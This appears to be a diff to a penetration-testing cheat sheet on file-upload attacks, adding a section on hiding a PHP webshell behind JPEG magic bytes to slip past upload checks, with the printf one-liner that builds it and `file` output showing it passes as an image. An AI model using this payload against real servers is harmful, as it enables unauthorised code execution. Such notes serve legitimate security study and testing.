@@ -3,7 +3,19 @@
  - If the file uploads successfully but does not execute code, try additional extensions
  - burp showing green for data is fine
 
-
+### jpeg bypass 
+[File upload Webshell : Jpeg](https://yolospacehacker.com/hackersguide/toolbox.php?id=imgwebshell)
+- If you can upload a jpg file, it is possible to hide a webshell in it.  
+- A jpeg file is identified by its first bytes which have the value: ffd8ffe0  
+To generate a file that will be identified as having a valid Jpeg header:
+```
+printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > webshell.jpg
+```
+- This file will be recognized as a jpg file
+```
+$ file webshell.jpg 
+webshell.jpg: JPEG image data
+```
 
 ### Basic explotation
 - One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.
